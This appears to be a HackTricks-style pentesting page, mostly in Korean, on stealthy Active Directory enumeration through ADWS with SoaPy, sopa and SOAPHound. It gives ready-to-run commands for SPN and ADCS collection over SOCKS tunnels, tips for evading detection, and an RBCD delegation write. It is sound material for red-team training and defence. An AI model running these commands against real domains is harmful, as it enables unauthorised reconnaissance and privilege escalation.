# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화되어** 있으며 TCP **9389**를 리슨합니다. 이름과 달리 **HTTP는 관여하지 않습니다**. 대신 해당 서비스는 LDAP 스타일의 데이터를 .NET 고유 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

이 트래픽은 이진 SOAP 프레임 내부에 캡슐화되어 비표준 포트를 통해 전송되기 때문에, **ADWS를 통한 열람은 전통적인 LDAP/389 & 636 트래픽보다 검사, 필터링 또는 시그니처 적용을 받을 가능성이 훨씬 낮습니다**. 운영자 입장에서는 다음을 의미합니다:

* 더 은밀한 정찰 – 블루팀은 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시를 통해 9389/TCP를 터널링함으로써 **non-Windows hosts (Linux, macOS)** 에서 수집 가능.
* LDAP로 얻을 수 있는 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 **쓰기** 기능(예: **RBCD**를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`) 제공.

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하고 `EnumerationContext` GUID를 반환하는 `Enumerate` 메시지로 시작하며, 이어서 서버 정의 결과 창까지 스트리밍하는 하나 이상의 `Pull` 메시지가 옵니다. 컨텍스트는 약 30분 후에 만료되므로 도구는 결과를 페이지네이션 하거나 상태를 잃지 않기 위해 필터를 분할(CN별 접두사 쿼리)해야 합니다. 보안 설명자(security descriptors)를 요청할 때는 SACL을 생략하려면 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 단순히 제거합니다.

> NOTE: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 뒤섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **순수 Python으로 ADWS 프로토콜 스택을 완전히 재구현한 구현체**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하여 .NET 런타임에 손대지 않고도 Unix 계열 시스템에서 수집할 수 있게 합니다.

### Key Features

* **SOCKS를 통해 프록시 지원** (C2 implants에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세밀한 검색 필터.
* 선택적 **쓰기(write)** 작업 (`--set` / `--delete`).
* BloodHound로 직접 인입 가능한 **BOFHound output mode**.
* 사람이 읽기 쉬운 형식이 필요할 경우 타임스탬프 / `userAccountControl`을 예쁘게 출력하는 `--parse` 플래그.

### Targeted collection flags & write operations

SoaPy는 ADWS상에서 가장 흔한 LDAP 헌팅 작업을 재현하는 큐레이션된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`와 함께 커스텀 풀용 원시 `--query` / `--filter` 옵션을 제공합니다. 이를 `--rbcd <source>`( `msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(타깃 Kerberoasting용 SPN 스테이징), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH`를 뒤집음) 같은 쓰기 프리미티브와 조합할 수 있습니다.

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
같은 호스트/자격 증명을 사용하여 결과를 즉시 weaponise하세요: dump RBCD-capable objects with `--rbcds`, then apply `--rbcd 'WEBSRV01$' --account 'FILE01$'` to stage a Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### 설치 (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - ADWS용 실용적인 클라이언트 (Golang으로)

soapy와 마찬가지로, [sopa](https://github.com/Macmod/sopa)는 ADWS 프로토콜 스택 (MS-NNS + MC-NMF + SOAP)을 Golang으로 구현하여 다음과 같은 ADWS 호출을 수행할 수 있는 명령줄 플래그를 제공합니다:

* **객체 검색 및 조회** - `query` / `get`
* **객체 수명주기** - `create [user|computer|group|ou|container|custom]` 및 `delete`
* **속성 편집** - `attr [add|replace|delete]`
* **계정 관리** - `set-password` / `change-password`
* 및 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등 기타 기능

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 모든 LDAP 상호작용을 ADWS 내부에 유지하고 BloodHound v4 호환 JSON을 출력하는 .NET 수집기입니다. 한 번 `--buildcache`로 `objectSid`, `objectGUID`, `distinguishedName` 및 `objectClass`의 전체 캐시를 구축하고, 이후 고용량의 `--bhdump`, `--certdump` (ADCS) 또는 `--dnsdump` (AD-integrated DNS) 실행에서 재사용함으로써 약 35개의 핵심 속성만 DC를 벗어나게 합니다. AutoSplit (`--autosplit --threshold <N>`)은 대형 포리스트에서 30분 EnumerationContext 타임아웃을 넘지 않도록 CN 접두사별로 쿼리를 자동으로 샤딩합니다.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON은 SharpHound/BloodHound 워크플로우에 직접 삽입할 수 있습니다—하위 그래프화 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 SOAPHound가 수백만 개 객체의 포리스트에서도 견고하게 동작하도록 하며, ADExplorer-style snapshots보다 쿼리 수를 적게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **domain & ADCS objects**를 열거하고, 이를 BloodHound JSON으로 변환한 뒤 인증서 기반 공격 경로를 탐색하는 방법을 보여줍니다 – 모두 Linux에서 수행합니다:

1. **Tunnel 9389/TCP**을 대상 네트워크에서 자신의 시스템으로 터널링합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등). 환경 변수로 `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하세요.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. BloodHound GUI에서 **ZIP을 업로드**하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` 쓰기 (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
이를 `s4u2proxy`/`Rubeus /getticket`와 결합하면 전체 **Resource-Based Constrained Delegation** 체인을 구성할 수 있습니다 (자세한 내용은 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 도구 요약

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그 변환 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 프록시 가능 |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | 잘 알려진 ADWS endpoints와 인터페이스하기 위한 일반 클라이언트 - enumeration, object creation, attribute modifications, password changes 가능 |

## 참고자료

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
